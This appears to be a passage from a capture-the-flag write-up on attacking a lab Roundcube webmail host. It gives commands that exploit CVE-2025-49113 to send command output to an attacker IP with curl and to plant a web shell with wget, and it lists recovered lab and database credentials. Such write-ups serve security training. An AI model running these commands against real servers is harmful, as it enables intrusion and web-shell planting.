...
The site is running **Roundcube webmail**. We're provided with starting credentials `tyler:LhKL1o9Nm3X2`, but they don't work for the Roundcube login or SSH.
...
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'curl http://10.10.15.79:8000/$(whoami)'
```
...
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 \
  'wget -O /var/www/html/roundcube/public_html/shell.php http://10.10.15.79:8000/shell.php'
```
...
Key findings:
- MySQL credentials: `roundcube:RCDBPass2025`
